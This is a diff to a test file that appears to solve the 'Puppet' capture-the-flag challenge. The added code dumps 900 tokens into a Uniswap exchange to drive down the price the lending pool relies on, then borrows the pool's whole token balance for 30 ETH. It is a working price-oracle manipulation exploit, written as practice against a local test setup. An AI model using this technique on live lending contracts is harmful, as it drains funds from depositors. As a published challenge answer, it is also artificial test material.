@@ -74,17 +74,19 @@ describe('[Challenge] Puppet', function () {
         );
         
         // Ensure Uniswap exchange is working as expected
+        ethReceived = calculateTokenToEthInputPrice(
+            ethers.utils.parseEther('1'),
+            UNISWAP_INITIAL_TOKEN_RESERVE,
+            UNISWAP_INITIAL_ETH_RESERVE
+        );
+        console.log("Eth received for selling 1 DVT token : ", ethers.utils.formatEther(ethReceived));
         expect(
             await this.uniswapExchange.getTokenToEthInputPrice(
                 ethers.utils.parseEther('1'),
                 { gasLimit: 1e6 }
             )
         ).to.be.eq(
-            calculateTokenToEthInputPrice(
-                ethers.utils.parseEther('1'),
-                UNISWAP_INITIAL_TOKEN_RESERVE,
-                UNISWAP_INITIAL_ETH_RESERVE
-            )
+            ethReceived
         );
         
         // Setup initial token balances of pool and attacker account
@@ -103,6 +105,37 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        SWAP_TOKENS = ethers.utils.parseEther('900');
+        ethReceivedInExploit = await this.uniswapExchange.getTokenToEthInputPrice(
+            SWAP_TOKENS,
+            { gasLimit: 1e6 }
+        );
+        console.log("Eth received in depositing %s tokens is %s", ethers.utils.formatEther(SWAP_TOKENS), ethers.utils.formatEther(ethReceivedInExploit));
+
+        await this.token.connect(attacker).approve(
+            this.uniswapExchange.address,
+            SWAP_TOKENS
+        );
+        console.log("Attacker ETH balance before : ", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
+        // Swapping token for ETH
+        ethSwapped = await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
+            SWAP_TOKENS, 
+            1,
+            (await ethers.provider.getBlock('latest')).timestamp * 2 ,
+            { gasLimit: 1e6 }
+        );
+        attackerEthBalance = await ethers.provider.getBalance(attacker.address);
+        console.log("Attacker ETH balance after : ", ethers.utils.formatEther(attackerEthBalance));
+
+        console.log("Token balance before borrow (after swap) : ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
+
+        await this.lendingPool.connect(attacker).borrow(
+            await this.token.balanceOf(this.lendingPool.address),
+            { value: ethers.utils.parseEther('30') }
+        );
+
+        console.log("Token balance after borrow : ", ethers.utils.formatEther(await this.token.balanceOf(attacker.address)));
+        console.log("Attacker final ETH balance : ", ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
     });
 
     after(async function () {
